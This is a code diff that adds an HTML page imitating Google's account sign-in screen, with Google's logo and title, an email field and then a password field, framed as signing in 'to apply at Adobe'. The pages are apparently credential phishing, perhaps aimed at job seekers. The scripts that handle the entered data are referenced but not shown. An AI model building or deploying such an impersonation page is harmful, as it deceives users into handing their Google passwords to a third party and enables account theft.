@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <link rel="icon" href="Logo/Google__G__logo.svg" type="image/svg+xml">
+    <style>
+        :root {
+            --bg-color: #0b0b0b;
+            --card-bg: #000000;
+            --text-main: #e3e3e3;
+            --text-sub: #c4c7c5;
+            --accent-blue: #a8c7fa;
+            --border-color: #8e918f;
+            --input-focus: #a8c7fa;
+            --error-color: #f28482;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: var(--bg-color);
+            font-family: 'Roboto', sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            color: var(--text-main);
+        }
+
+        .login-card {
+            background-color: var(--card-bg);
+            width: 100%;
+            max-width: 720px;
+            min-height: 420px;
+            border-radius: 28px;
+            padding: 40px;
+            display: flex;
+            box-sizing: border-box;
+            position: relative;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.3);
+        }
+
+        .left-col {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .google-logo {
+            width: 32px;
+            height: 32px;
+            margin-bottom: 20px;
+        }
+
+        h1 {
+            font-size: 36px;
+            font-weight: 400;
+            margin: 0 0 12px 0;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: var(--text-sub);
+            margin-bottom: 8px;
+        }
+
+        .user-pill {
+            display: flex;
+            align-items: center;
+            border: 1px solid var(--border-color);
+            padding: 8px 14px;
+            border-radius: 20px;
+            width: fit-content;
+            margin-top: 20px;
+            cursor: pointer;
+            transition: border-color 0.2s ease;
+            gap: 10px;
+        }
+
+        .user-pill:hover {
+            border-color: var(--accent-blue);
+        }
+
+        .avatar {
+            width: 32px;
+            height: 32px;
+            background: #004a77;
+            color: #c2e7ff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .right-col {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+            padding-left: 40px;
+            padding-top: 20px;
+        }
+
+        .input-group {
+            position: relative;
+            margin-top: 25px;
+            width: 100%;
+        }
+
+        input {
+            width: 100%;
+            background: transparent;
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            padding: 18px 16px 18px 16px;
+            color: white;
+            font-size: 16px;
+            box-sizing: border-box;
+            outline: none;
+            transition: border-color 0.2s ease, padding 0.2s ease;
+        }
+
+        input:focus {
+            border: 2px solid var(--accent-blue);
+            padding: 17px 15px 17px 15px;
+        }
+
+        input.error {
+            border-color: var(--error-color);
+        }
+
+        label {
+            position: absolute;
+            left: 12px;
+            top: 16px;
+            color: var(--text-sub);
+            pointer-events: none;
+            transition: 0.2s ease all;
+            background: var(--card-bg);
+            padding: 0 4px;
+            font-size: 16px;
+        }
+
+        input:focus ~ label, input:not(:placeholder-shown) ~ label {
+            top: -10px;
+            font-size: 12px;
+            color: var(--accent-blue);
+        }
+
+        input.error:focus ~ label, input.error:not(:placeholder-shown) ~ label {
+            color: var(--error-color);
+        }
+
+        .error-message {
+            color: var(--error-color);
+            font-size: 12px;
+            margin-top: 8px;
+            display: none;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        .link-text {
+            color: var(--accent-blue);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            margin-top: 12px;
+            display: inline-block;
+            cursor: pointer;
+            transition: color 0.2s ease;
+        }
+
+        .link-text:hover {
+            color: #c5d5ff;
+        }
+
+        .privacy-notice {
+            font-size: 14px;
+            color: var(--text-sub);
+            margin-top: 40px;
+            line-height: 1.4;
+        }
+
+        .privacy-notice a {
+            color: var(--accent-blue);
+            text-decoration: none;
+        }
+
+        .checkbox-group {
+            margin-top: 12px;
+            display: flex;
+            align-items: center;
+        }
+
+        .checkbox-group input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            margin-right: 10px;
+            cursor: pointer;
+            accent-color: var(--accent-blue);
+        }
+
+        .checkbox-group label {
+            position: static;
+            font-size: 14px;
+            background: none;
+            padding: 0;
+            top: auto;
+            margin: 0;
+            color: var(--text-main);
+            cursor: pointer;
+        }
+
+        .button-row {
+            margin-top: auto;
+            display: flex;
+            justify-content: flex-end;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .btn-text {
+            color: var(--accent-blue);
+            background: none;
+            border: none;
+            font-weight: 500;
+            cursor: pointer;
+            font-size: 14px;
+            font-family: 'Roboto', sans-serif;
+            transition: color 0.2s ease;
+        }
+
+        .btn-text:hover {
+            color: #c5d5ff;
+        }
+
+        .btn-next {
+            background-color: var(--accent-blue);
+            color: #003354;
+            border: none;
+            padding: 12px 26px;
+            border-radius: 20px;
+            font-weight: 500;
+            cursor: pointer;
+            font-size: 14px;
+            font-family: 'Roboto', sans-serif;
+            transition: background-color 0.2s ease;
+        }
+
+        .btn-next:hover {
+            background-color: #d0deff;
+        }
+
+        .btn-next:disabled {
+            background-color: #5f6368;
+            color: #9aa0a6;
+            cursor: not-allowed;
+        }
+
+        .footer {
+            width: 100%;
+            max-width: 840px;
+            margin-top: 24px;
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            color: var(--text-sub);
+            padding: 0 10px;
+        }
+
+        .footer-links {
+            display: flex;
+            gap: 24px;
+        }
+
+        .footer-links span:hover {
+            color: var(--accent-blue);
+            cursor: pointer;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        @media (max-width: 768px) {
+            .login-card {
+                flex-direction: column;
+                max-width: 100%;
+                margin: 20px;
+                border-radius: 16px;
+                min-height: auto;
+                padding: 30px 20px;
+            }
+
+            h1 {
+                font-size: 24px;
+            }
+
+            .right-col {
+                padding-left: 0;
+                padding-top: 20px;
+            }
+
+            .button-row {
+                flex-direction: column;
+                gap: 10px;
+            }
+
+            .btn-next, .btn-text {
+                width: 100%;
+                padding: 16px 12px;
+                font-size: 16px;
+            }
+        }
+    </style>
+</head>
+<body id="login-page">
+    <div class="login-card">
+        <div id="view-email" class="left-col">
+            <img class="google-logo" src="Logo/Google__G__logo.svg" alt="Google">
+            <h1>Sign in</h1>
+            <p class="subtitle">to apply at Adobe</p>
+        </div>
+
+        <div id="view-password-header" class="left-col hidden">
+            <img class="google-logo" src="Logo/Google__G__logo.svg" alt="Google">
+            <h1 id="user-greeting">Hi User</h1>
+            <div class="user-pill" onclick="goBackToEmail()">
+                <div class="avatar" id="user-avatar">A</div>
+                <span id="display-email">email@gmail.com</span>
+                <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor" style="margin-left:8px">
+                    <path d="M7 10l5 5 5-5z"/>
+                </svg>
+            </div>
+        </div>
+
+        <div class="right-col">
+            <div id="input-email-container">
+                <div class="input-group">
+                    <input type="email" id="identifier" placeholder=" " autocomplete="email">
+                    <label for="identifier">Email or phone</label>
+                </div>
+                <div class="error-message" id="emailError"></div>
+                <a href="#" class="link-text" onclick="event.preventDefault();">Forgot email?</a>
+                <p class="privacy-notice">
+                    Not your computer? Use a private browsing window to sign in safely.
+                </p>
+            </div>
+
+            <div id="input-password-container" class="hidden">
+                <div class="input-group">
+                    <input type="password" id="password" placeholder=" " autocomplete="current-password">
+                    <label for="password">Enter your password</label>
+                </div>
+                <div class="error-message" id="passwordError"></div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="show-pass">
+                    <label for="show-pass">Show password</label>
+                </div>
+            </div>
+
+            <div class="button-row">
+                <button class="btn-text" id="btn-secondary" onclick="handleSecondaryAction()">Create account</button>
+                <button class="btn-next" id="btn-next">Next</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <div>English (United States)</div>
+        <div class="footer-links">
+            <span>Help</span>
+            <span>Privacy</span>
+            <span>Terms</span>
+        </div>
+    </div>
+
+    <script src="local-storage.js"></script>
+    <script src="script.js"></script>
+</body>
+</html>
